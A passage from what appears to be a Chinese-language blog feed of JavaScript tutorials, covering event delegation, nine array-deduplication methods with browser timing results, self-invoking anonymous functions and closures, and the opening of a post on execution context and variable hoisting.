class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs bash">window.onload = <span class="hljs-function"><span class="hljs-title">function</span></span>()&#123;<br>  var oUl = document.getElementById(<span class="hljs-string">"ul"</span>);<br>  var aLi = oUl.getElementsByTagName(<span class="hljs-string">"li"</span>);<br>  var oBtn = document.getElementById(<span class="hljs-string">"btn"</span>);<br>  var iNow = 4;<br> <br>  oUl.onmouseover = <span class="hljs-keyword">function</span>(ev)&#123;<br>    var ev = ev || window.event;<br>    var target = ev.target || ev.srcElement;<br>    //alert(target.innerHTML);<br>    <span class="hljs-keyword">if</span>(target.nodeName.toLowerCase() == <span class="hljs-string">"li"</span>)&#123;<br>    target.style.background = <span class="hljs-string">"red"</span>;<br>    &#125;<br>  &#125;<br>  oUl.onmouseout = <span class="hljs-keyword">function</span>(ev)&#123;<br>    var ev = ev || window.event;<br>    var target = ev.target || ev.srcElement;<br>    //alert(target.innerHTML);<br>    <span class="hljs-keyword">if</span>(target.nodeName.toLowerCase() == <span class="hljs-string">"li"</span>)&#123;<br>    target.style.background = <span class="hljs-string">""</span>;<br>    &#125;<br>  &#125;<br>  oBtn.onclick = <span class="hljs-function"><span class="hljs-title">function</span></span>()&#123;<br>    iNow ++;<br>    var oLi = document.createElement(<span class="hljs-string">"li"</span>);<br>    oLi.innerHTML = 1111 *iNow;<br>    oUl.appendChild(oLi);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> JS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>js的9种数组去重及性能分析</title>
      <link href="/2018/07/26/js%E7%9A%849%E7%A7%8D%E6%95%B0%E7%BB%84%E5%8E%BB%E9%87%8D%E5%8F%8A%E6%80%A7%E8%83%BD%E5%88%86%E6%9E%90/"/>
      <url>/2018/07/26/js%E7%9A%849%E7%A7%8D%E6%95%B0%E7%BB%84%E5%8E%BB%E9%87%8D%E5%8F%8A%E6%80%A7%E8%83%BD%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p>最近在面试的过程中，碰到了如何在 JavaScript 中实现数组去重的功能，当时面试官说不用考虑性能什么的，所以我想到的思路是这样的：</p><p>1.新建一个数组；<br>2.每次遇到一个字符，进行判定；<br>3.如果在新的数组中没有这个字符，就插入到这个新数组中；<br>4.如果有这个字符，开始读取下一个字符；<br>5.重复步骤 2 - 4，直到数组遍历完了，最后返回这个新数组。</p><p>查了查 JavaScript 中几种常见数组去重的方法，这里做个总结，然后并附上我对这几种方法性能的测试结果。</p><p>首先创建随机数组:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">function</span> createArr(length) &#123;<br><br>    var arr = new Array();<br>    <span class="hljs-keyword">for</span>(var i = 0; i &lt; length; i++) &#123;<br>        arr[i] = Math.floor(Math.random() * 1000) + 1;<br>    &#125;<br><br>    <span class="hljs-built_in">return</span> arr;<br>&#125;<br></code></pre></td></tr></table></figure></p><hr><h2 id="1-for循环（两次嵌套）-新数组"><a href="#1-for循环（两次嵌套）-新数组" class="headerlink" title="1.for循环（两次嵌套）+新数组"></a>1.for循环（两次嵌套）+新数组</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">//chrome: max: 1443, min: 1181, average: 1207.47<br>//firefox: max: 238, min: 178, average: 185.7<br><span class="hljs-keyword">function</span> sort1(arr) &#123;<br>    var flag = 0;<br>    var result = new Array();<br>    <span class="hljs-keyword">for</span>(var i = 0; i &lt; arr.length; i++) &#123;<br>        flag = 0;<br>        <span class="hljs-keyword">for</span>(var j = 0; j &lt; arr.length; j++) &#123;<br>            <span class="hljs-keyword">if</span>(result[j] == arr[i]) &#123;<br>                flag = 1;<span class="hljs-built_in">break</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(flag == 0)<br>            result.push(arr[i]);<br>    &#125;<br><br>    <span class="hljs-built_in">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>性能最差</strong></p><hr><h2 id="2-for循环（一次）-indexOf-数组"><a href="#2-for循环（一次）-indexOf-数组" class="headerlink" title="2.for循环（一次）+indexOf()+数组"></a>2.for循环（一次）+indexOf()+数组</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">//chrome: max: 87, min: 65, average: 69.75<br>//firefox: max: 110, min: 38, average: 41.96<br><span class="hljs-keyword">function</span> sort1(arr) &#123;<br>    var result = new Array();<br>    <span class="hljs-keyword">for</span>(var i = 0; i &lt; arr.length; i++) &#123;<br>        <span class="hljs-keyword">if</span>(result.indexOf(arr[i]) == -1)<br>            result.push(arr[i]);<br>    &#125;<br>    <span class="hljs-built_in">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>将方法1进行一次改进，对新数组判定是否有字符，可以调用 Array.prototype.indexOf 这个函数，执行时间缩减了很多。 </strong></p><hr><h2 id="3-forEach-indexOf-新数组"><a href="#3-forEach-indexOf-新数组" class="headerlink" title="3.forEach()+indexOf()+新数组"></a>3.forEach()+indexOf()+新数组</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">//chrome: max: 139, min: 69, average: 77.38<br>//firefox:max: 48, min: 38, average: 41.08<br><span class="hljs-keyword">function</span> sort1(arr) &#123;<br>    var result = new Array();<br>    arr.forEach((item, index, array) =&gt; &#123;<br>        <span class="hljs-keyword">if</span>(result.indexOf(item) == -1)<br>            result.push(item);<br>    &#125;)<br>    <span class="hljs-built_in">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>性能方面火狐上与方法2时间一样，谷歌浏览器执行时间比方法2稍长。 </strong></p><hr><h2 id="4-filter-indexOf"><a href="#4-filter-indexOf" class="headerlink" title="4.filter()+indexOf()"></a>4.filter()+indexOf()</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">// chrome: max: 167, min: 130, average: 142.17<br>// firefox: max: 144, min: 74, average: 80.98<br><span class="hljs-keyword">function</span> sort1(arr) &#123;<br>     <span class="hljs-built_in">return</span> arr.filter((item, index, array) =&gt;  array.indexOf(item) === index);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>这里用 ES5 中的 filter()， 替代一下方法2中的 for(…) {}，性能比方法2、方法3都要长。 </strong></p><hr><h2 id="5-reduce-includes-…-展开运算符"><a href="#5-reduce-includes-…-展开运算符" class="headerlink" title="5.reduce+includes()+ …(展开运算符)"></a>5.reduce+includes()+ …(展开运算符)</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">//chrome: max: 128, min: 99, average: 105.27<br>//firefox: max: 58, min: 46, average: 49.04<br><span class="hljs-keyword">function</span> sort1(arr) &#123;<br>    <span class="hljs-built_in">return</span> arr.reduce((prev,cur) =&gt; prev.indexOf(cur) != -1 ? prev : [...prev,cur],[]);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>这里用 ES5 中的 reduce() 累加器，来替代上面方法中的循环，并用 ES6 中的 …(展开运算符)，来替代 push() 的作用。性能方面比方法2、3慢，比方法4快。 </strong></p><hr><h2 id="6-filter-new-Map"><a href="#6-filter-new-Map" class="headerlink" title="6.filter() + new Map()"></a>6.filter() + new Map()</h2> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"> //chrome: max: 9, min: 3, average: 4.16<br>//firefox: max: 10, min: 4, average: 6.24<br><span class="hljs-keyword">function</span> sort1(arr) &#123;<br>    const seen = new Map();<br>    <span class="hljs-built_in">return</span> arr.filter((item) =&gt; !seen.has(item) &amp;&amp; seen.set(item, 1));<br>&#125;<br></code></pre></td></tr></table></figure><p> <strong>这里用 ES6 中的 Map 集合，来替代前面方法中的新数组，调用 Map.has 替代 indexOf()，Map.set 替代 push()，再结合 ES5 中的 filter()。性能方面，比前面的方法都要快。</strong></p><hr><h2 id="7-new-Set-Array-form"><a href="#7-new-Set-Array-form" class="headerlink" title="7.new Set()+Array.form()"></a>7.new Set()+Array.form()</h2> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"> //chrome: max: 7, min: 3, average: 4.24<br>//firefox: max: 6, min: 2, average: 3.74<br><span class="hljs-keyword">function</span> sort1(arr) &#123;<br>    <span class="hljs-built_in">return</span> Array.from(new Set(arr));<br>&#125;<br></code></pre></td></tr></table></figure><p> <strong>这里使用 ES6 中的 Set 集合，Set 集合是一种无重复元素的列表，因此new Set(arr)会自动剔除重复元素，Array.from(…)，将 Set 集合转换为数组。性能方面，谷歌上与方法6差不多，火狐上比方法6略快。</strong></p><hr><h2 id="8-new-Set-…-展开运算符"><a href="#8-new-Set-…-展开运算符" class="headerlink" title="8.new Set()+…(展开运算符)"></a>8.new Set()+…(展开运算符)</h2> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"> //chrome: max: 8, min: 3, average: 4.34<br>//firefox: max; 6, min: 2, average: 3.9<br><span class="hljs-keyword">function</span> sort1(arr) &#123;<br>    <span class="hljs-built_in">return</span> [...(new Set(arr))];<br>&#125;<br></code></pre></td></tr></table></figure><p> <strong>思路与方法7一致，只是将 Set 集合转换为数组的实现方法从 Array.from(…) 改成了 …(展开运算符)。性能方面与方法7差不多。 </strong></p><hr><h2 id="9-for循环-一次-新对象"><a href="#9-for循环-一次-新对象" class="headerlink" title="9.for循环(一次)+新对象"></a>9.for循环(一次)+新对象</h2> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"> //chrome: max: 4, min: 1, average: 1.39<br>//firefox: max: 2, min: 0, average: 0.52<br><span class="hljs-keyword">function</span> sort1(arr) &#123;<br>    <span class="hljs-built_in">let</span> obj = &#123;&#125;;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-built_in">let</span> i = 0; i &lt; arr.length; i++) &#123;<br>        <span class="hljs-keyword">if</span> (!obj[arr[i]]) &#123;<br>            obj[arr[i]] = 1;<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">return</span> Object.keys(obj);;<br>&#125;<br></code></pre></td></tr></table></figure><p> <strong>思路是将方法2、方法3等方法中的创建一个新数组，改成创建一个新对象，通过对对象的 key 值进行判定，存在跳过，不存在则将字符以对象的 key 值存储。性能方面，执行时间是所有的方法中最短的，因为对象的属性是基于Hash表实现，因此对属性进行访问的时间复杂度可以达到O(1)，而诸如 indexOf()都需要遍历所有元素来检查，此方法的时间复杂度是O(n)。</strong></p><hr><p> <strong>参考文章：<a href="http://www.cnblogs.com/lewiscutey/p/8269567.html" target="_blank" rel="noopener">JavaScript数组去重的10种方法</a></strong></p>]]></content>
      
      
      <categories>
          
          <category> JS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>js匿名函数自执行</title>
      <link href="/2018/07/25/js%E5%8C%BF%E5%90%8D%E5%87%BD%E6%95%B0%E8%87%AA%E6%89%A7%E8%A1%8C/"/>
      <url>/2018/07/25/js%E5%8C%BF%E5%90%8D%E5%87%BD%E6%95%B0%E8%87%AA%E6%89%A7%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<h2 id="1-匿名函数"><a href="#1-匿名函数" class="headerlink" title="1.匿名函数"></a>1.匿名函数</h2><p>函数是JavaScript中最灵活的一种对象，这里只是讲解其匿名函数的用途。匿名函数：就是没有函数名的函数。</p><h3 id="1-1函数的定义，大概分三种方式"><a href="#1-1函数的定义，大概分三种方式" class="headerlink" title="1.1函数的定义，大概分三种方式"></a>1.1函数的定义，大概分三种方式</h3><p>第一种，最常规</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">function</span> double(x)&#123;<br>    <span class="hljs-built_in">return</span> 2 * x;   <br>&#125;<br></code></pre></td></tr></table></figure><p>第二种，使用Function构造函数，把参数列表和函数都作为字符串，不方便，不建议用<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">var double = new Function(<span class="hljs-string">'x'</span>, <span class="hljs-string">'return 2 * x;'</span>);<br></code></pre></td></tr></table></figure></p><p>第三种:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">var double = <span class="hljs-keyword">function</span>(x) &#123; <span class="hljs-built_in">return</span> 2* x; &#125;<br></code></pre></td></tr></table></figure></p><p>注意“=”右边的函数就是一个匿名函数，创造完毕函数后，又将该函数赋给了变量square。</p><h3 id="1-2匿名函数的创建"><a href="#1-2匿名函数的创建" class="headerlink" title="1.2匿名函数的创建"></a>1.2匿名函数的创建</h3><p>第一种方式：就是上面所讲的定义square函数，这也是最常用的方式之一。</p><p>第二种方式：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">(<span class="hljs-keyword">function</span>(x, y)&#123;<br>    alert(x + y);  <br>&#125;)(2, 3);<br></code></pre></td></tr></table></figure></p><h3 id="自执行的匿名函数"><a href="#自执行的匿名函数" class="headerlink" title="自执行的匿名函数"></a>自执行的匿名函数</h3><ol><li><p>什么是自执行的匿名函数?<br>它是指形如这样的函数: (function {// code})();</p></li><li><p>疑问<br>为什么(function {// code})();可以被执行, 而function {// code}();却会报错?</p></li><li><p>分析<br>(1). 首先, 要清楚两者的区别:<br>(function {// code})是表达式, function {// code}是函数声明.</p></li></ol><p>(2). 其次, js”预编译”的特点:<br>js在”预编译”阶段, 会解释函数声明, 但却会忽略表式.</p><p>(3). 当js执行到function() {//code}();时, 由于function() {//code}在”预编译”阶段已经被解释过,<br>js会跳过function(){//code}, 试图去执行();, 故会报错;<br>当js执行到(function {// code})();时, 由于(function {// code})是表达式,<br>    js会去对它求解得到返回值, 由于返回值是一 个函数, 故而遇到();时, 便会被执行.</p><p>另外， 函数转换为表达式的方法并不一定要靠分组操作符()，我们还可以用void操作符，~操作符，!操作符，=赋值操作符……</p><p>如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">!<span class="hljs-function"><span class="hljs-title">function</span></span>()&#123;   <br>  alert(<span class="hljs-string">"另类的匿名函数自执行"</span>);   <br>&#125;();<br></code></pre></td></tr></table></figure><hr><h2 id="2-闭包"><a href="#2-闭包" class="headerlink" title="2.闭包"></a>2.闭包</h2><p>闭包的英文单词是closure，这是JavaScript中非常重要的一部分知识，因为使用闭包可以大大减少我们的代码量，使我们的代码看上去更加清晰等等，总之功能十分强大。</p><p>闭包的含义：闭包说白了就是函数的嵌套，内层的函数可以使用外层函数的所有变量，即使外层函数已经执行完毕（这点涉及JavaScript作用域链）。</p><h3 id="实例一"><a href="#实例一" class="headerlink" title="实例一"></a>实例一</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">checkClosure</span></span>()&#123;<br>    var str = <span class="hljs-string">'rain-man'</span>;<br>    setTimeout(<br>        <span class="hljs-function"><span class="hljs-title">function</span></span>()&#123; alert(str); &#125; //这是一个匿名函数<br>    , 2000);<br>&#125;<br>checkClosure();<br></code></pre></td></tr></table></figure><h3 id="实例二，优化"><a href="#实例二，优化" class="headerlink" title="实例二，优化"></a>实例二，优化</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">function</span> forTimeout(x, y)&#123;<br>    alert(x + y);<br>&#125;<br><span class="hljs-keyword">function</span> delay(x , y  , time)&#123;<br>    setTimeout(<span class="hljs-string">'forTimeout('</span> +  x + <span class="hljs-string">','</span> +  y + <span class="hljs-string">')'</span> , time);    <br>&#125;<br>/**<br> * 上面的delay函数十分难以阅读，也不容易编写，但如果使用闭包就可以让代码更加清晰<br> * <span class="hljs-keyword">function</span> delay(x , y , time)&#123;<br> *     setTimeout(<br> *         <span class="hljs-function"><span class="hljs-title">function</span></span>()&#123;<br> *             forTimeout(x , y) <br> *         &#125;          <br> *     , time);   <br> * &#125;<br> */<br></code></pre></td></tr></table></figure><h2 id="3-举例"><a href="#3-举例" class="headerlink" title="3.举例"></a>3.举例</h2><p>匿名函数最大的用途是创建闭包（这是JavaScript语言的特性之一），并且还可以构建命名空间，以减少全局变量的使用。</p><h3 id="实例三"><a href="#实例三" class="headerlink" title="实例三"></a>实例三</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">var oEvent = &#123;&#125;;<br>(<span class="hljs-function"><span class="hljs-title">function</span></span>()&#123; <br>    var addEvent = <span class="hljs-function"><span class="hljs-title">function</span></span>()&#123; /*代码的实现省略了*/ &#125;;<br>    <span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">removeEvent</span></span>()&#123;&#125;<br><br>    oEvent.addEvent = addEvent;<br>    oEvent.removeEvent = removeEvent;<br>&#125;)();<br></code></pre></td></tr></table></figure><p>在这段代码中函数addEvent和removeEvent都是局部变量，但我们可以通过全局变量oEvent使用它，这就大大减少了全局变量的使用，增强了网页的安全性。 我们要想使用此段代码：oEvent.addEvent(document.getElementById(‘box’) , ‘click’ , function(){});</p><h3 id="实例四"><a href="#实例四" class="headerlink" title="实例四"></a>实例四</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">var rainman = (<span class="hljs-keyword">function</span>(x , y)&#123;<br>    <span class="hljs-built_in">return</span> x + y;<br>&#125;)(2 , 3);<br>/**<br> * 也可以写成下面的形式，因为第一个括号只是帮助我们阅读，但是不推荐使用下面这种书写格式。<br> * var rainman = <span class="hljs-keyword">function</span>(x , y)&#123;<br> *    <span class="hljs-built_in">return</span> x + y;<br> * &#125;(2 , 3);<br> */<br></code></pre></td></tr></table></figure><p>在这里我们创建了一个变量rainman，并通过直接调用匿名函数初始化为5，这种小技巧有时十分实用。</p><h3 id="实例五"><a href="#实例五" class="headerlink" title="实例五"></a>实例五</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">var outer = null;<br><br>(<span class="hljs-function"><span class="hljs-title">function</span></span>()&#123;<br>    var one = 1;<br>    <span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">inner</span></span> ()&#123;<br>        one += 1;<br>        alert(one);<br>    &#125;<br>    outer = inner;<br>&#125;)();<br><br>outer();    //2<br>outer();    //3<br>outer();    //4<br></code></pre></td></tr></table></figure><p>这段代码中的变量one是一个局部变量（因为它被定义在一个函数之内），因此外部是不可以访问的。但是这里我们创建了inner函数，inner函数是可以访问变量one的；又将全局变量outer引用了inner，所以三次调用outer会弹出递增的结果。</p><h2 id="4-注意"><a href="#4-注意" class="headerlink" title="4.注意"></a>4.注意</h2><h3 id="4-1闭包允许内层函数引用父函数中的变量，但是该变量是最终值"><a href="#4-1闭包允许内层函数引用父函数中的变量，但是该变量是最终值" class="headerlink" title="4.1闭包允许内层函数引用父函数中的变量，但是该变量是最终值"></a>4.1闭包允许内层函数引用父函数中的变量，但是该变量是最终值</h3><h4 id="实例六"><a href="#实例六" class="headerlink" title="实例六"></a>实例六</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">/**<br> * &lt;body&gt;<br> * &lt;ul&gt;<br> *     &lt;li&gt;one&lt;/li&gt;<br> *     &lt;li&gt;two&lt;/li&gt;<br> *     &lt;li&gt;three&lt;/li&gt;<br> *     &lt;li&gt;one&lt;/li&gt;<br> * &lt;/ul&gt;<br> */<br><br>var lists = document.getElementsByTagName(<span class="hljs-string">'li'</span>);<br><span class="hljs-keyword">for</span>(var i = 0 , len = lists.length ; i &lt; len ; i++)&#123;<br>    lists[ i ].onmouseover = <span class="hljs-function"><span class="hljs-title">function</span></span>()&#123;<br>        alert(i);    <br>    &#125;;<br>&#125;<br></code></pre></td></tr></table></figure><p>你会发现当鼠标移过每一个&lt;li&rt;元素时，总是弹出4，而不是我们期待的元素下标。这是为什么呢？注意事项里已经讲了（最终值）。显然这种解释过于简单，当mouseover事件调用监听函数时，首先在匿名函数（ function(){ alert(i); }）内部查找是否定义了 i，结果是没有定义；因此它会向上查找，查找结果是已经定义了，并且i的值是4（循环后的i值）；所以，最终每次弹出的都是4。</p><p>解决方法一：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">var lists = document.getElementsByTagName(<span class="hljs-string">'li'</span>);<br><span class="hljs-keyword">for</span>(var i = 0 , len = lists.length ; i &lt; len ; i++)&#123;<br>    (<span class="hljs-keyword">function</span>(index)&#123;<br>        lists[ index ].onmouseover = <span class="hljs-function"><span class="hljs-title">function</span></span>()&#123;<br>            alert(index);    <br>        &#125;;                    <br>    &#125;)(i);<br>&#125;<br></code></pre></td></tr></table></figure></p><p>解决办法二:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">var lists = document.getElementsByTagName(<span class="hljs-string">'li'</span>);<br><span class="hljs-keyword">for</span>(var i = 0, len = lists.length; i &lt; len; i++)&#123;<br>    lists[ i ].$<span class="hljs-variable">$index</span> = i;    //通过在Dom元素上绑定$<span class="hljs-variable">$index</span>属性记录下标<br>    lists[ i ].onmouseover = <span class="hljs-function"><span class="hljs-title">function</span></span>()&#123;<br>        alert(this.$<span class="hljs-variable">$index</span>);    <br>    &#125;;<br>&#125;<br></code></pre></td></tr></table></figure></p><p>解决方法三：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">function</span> eventListener(list, index)&#123;<br>    list.onmouseover = <span class="hljs-function"><span class="hljs-title">function</span></span>()&#123;<br>        alert(index);<br>    &#125;;<br>&#125;<br>var lists = document.getElementsByTagName(<span class="hljs-string">'li'</span>);<br><span class="hljs-keyword">for</span>(var i = 0 , len = lists.length ; i &lt; len ; i++)&#123;<br>    eventListener(lists[ i ] , i);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="4-2内存泄漏"><a href="#4-2内存泄漏" class="headerlink" title="4.2内存泄漏"></a>4.2内存泄漏</h3><p>使用闭包十分容易造成浏览器的内存泄露，严重情况下会是浏览器挂死，感兴趣的的话可以参考：<a href="http://www.cnblogs.com/rainman/archive/2009/03/07/1405624.html" target="_blank" rel="noopener"><font color="#dd0000">内存泄漏</font></a>。</p>]]></content>
      
      
      <categories>
          
          <category> JS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>js高级语法</title>
      <link href="/2018/07/24/js%E9%AB%98%E7%BA%A7%E8%AF%AD%E6%B3%95/"/>
      <url>/2018/07/24/js%E9%AB%98%E7%BA%A7%E8%AF%AD%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h2 id="一-执行上下文"><a href="#一-执行上下文" class="headerlink" title="一,执行上下文"></a>一,执行上下文</h2><p>也称为可执行代码和执行上下文<br>执行代码:1.全局代码 2.函数代码 3.eval代码<br>eval(“var a = 200;console.log(a)”)<br>执行上下文 - Context<br>所处的一个环境，环境不同含义也随着改变了<br>当可执行代码执行的过程中，都会产生一个可执行环境<br>在执行完之后，执行上下文的环境也随着销毁<br>执行上下文中变量存在于：<br>变量对象：VO - var 声明的一个属性值 - 全局<br>活动对象：AO - 相对于函数创建的对象中的一个声明 - 局部 - 随执行完后销毁<br>不管变量在什么地方声明，都会在函数一运行就声明一个函数中的变量<br>变量提升：指一个函数上下文创建时，函数中的所有变量都会随函数的创建提升<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">    var x = 100;<br>    var outFunc = <span class="hljs-function"><span class="hljs-title">function</span></span>()&#123;<br>        x++;<br>        console.log(x);//NaN<br>        var x = 200;<br>    &#125;<br>    outFunc();<br>    console.log(x);//100<br>```    <br>函数中 x 声明提前，但是赋值并没有提前，所有此时的x为undefined，undefined进行运算结果就为NaN<br>```bash<br>var  outFunc = <span class="hljs-function"><span class="hljs-title">function</span></span>()&#123;<br>    var a = 100;<br>    var innerHtml = <span class="hljs-function"><span 